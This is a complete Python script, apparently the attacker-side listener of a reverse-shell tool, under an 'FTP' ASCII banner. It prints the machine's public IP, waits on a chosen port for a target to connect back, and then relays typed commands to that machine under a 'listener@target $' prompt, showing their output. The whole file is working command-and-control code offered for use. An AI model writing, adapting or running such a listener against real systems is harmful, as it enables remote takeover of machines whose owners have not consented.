#!/usr/bin/python3
"""
Simple listener script
Python 3.8+
"""
import requests
import optparse
import base64
import socket
import json



print( "\033[92m" +  r"""FFFFFFFFFFFFFFFFFFFFFFTTTTTTTTTTTTTTTTTTTTTTTPPPPPPPPPPPPPPPPP   
F::::::::::::::::::::FT:::::::::::::::::::::TP::::::::::::::::P  
F::::::::::::::::::::FT:::::::::::::::::::::TP::::::PPPPPP:::::P 
FF::::::FFFFFFFFF::::FT:::::TT:::::::TT:::::TPP:::::P     P:::::P
  F:::::F       FFFFFFTTTTTT  T:::::T  TTTTTT  P::::P     P:::::P
  F:::::F                     T:::::T          P::::P     P:::::P
  F::::::FFFFFFFFFF           T:::::T          P::::PPPPPP:::::P 
  F:::::::::::::::F           T:::::T          P:::::::::::::PP  
  F:::::::::::::::F           T:::::T          P::::PPPPPPPPP    
  F::::::FFFFFFFFFF           T:::::T          P::::P            
  F:::::F                     T:::::T          P::::P            
  F:::::F                     T:::::T          P::::P            
FF:::::::FF                 TT:::::::TT      PP::::::PP          
F::::::::FF                 T:::::::::T      P::::::::P          
F::::::::FF                 T:::::::::T      P::::::::P          
FFFFFFFFFFF                 TTTTTTTTTTT      PPPPPPPPPP""" + "\033[0m" ) 
print()
print()
print()

public_ip = requests.get("https://api.ipify.org").text
print(f"[+] Public IP: {public_ip}")

local_ip = socket.gethostbyname(socket.gethostname())
print(f"[+] Local IP: {local_ip}")


def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False


def is_valid_port(port):
    return port.isdigit() and 1 <= int(port) <= 65535



def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option('-l', '--local', dest='local_ip', help='Listener IP')
    parser.add_option('-p', '--port', dest='port', type=int, help='Listener port')

    (options, _) = parser.parse_args()

    # Ask for IP if missing or invalid
    while not options.local_ip or not is_valid_ip(options.local_ip):
        options.local_ip = input("[?] Enter a valid listener IP: ").strip()

    # Ask for port if missing or invalid
    while not options.port or not (1 <= options.port <= 65535):
        try:
            options.port = int(input("[?] Enter a valid listener port (1-65535): ").strip())
        except ValueError:
            options.port = None

    return options



options = get_arguments()

if not options.local_ip or not options.port:
    print("[-] Usage: python3 listener.py -l <IP> -p <PORT>")
    exit()


class Listener:
    def __init__(self, local_ip, port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((local_ip, port))
        self.listener.listen(1)

        print("[+] Listening on {}:{}".format(local_ip, port))
        self.connection, address = self.listener.accept()
        print("[+] Connection from {}".format(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.sendall(json_data.encode())

    def reliable_receive(self):
        data = b""
        while True:
            try:
                data += self.connection.recv(4096)
                return json.loads(data.decode())
            except ValueError:
                continue

    def run(self):
        print("\n[+] Interactive command session started")
        print("[*] Type 'exit' to close the connection")
        print("-" * 50)

        while True:
            try:
                command = input("listener@target $ ").strip()

                if not command:
                    continue

                self.reliable_send({"cmd": command})

                if command == "exit":
                    print("[*] Closing connection...")
                    self.connection.close()
                    break

                result = self.reliable_receive()

                output = result.get("output", "")
                if output:
                    print(output)
                else:
                    print("[*] Command executed with no output")

                print("-" * 50)

            except KeyboardInterrupt:
                print("\n[*] Interrupted by user, closing connection.")
                self.connection.close()
                break

listener = Listener(options.local_ip, options.port)
listener.run()
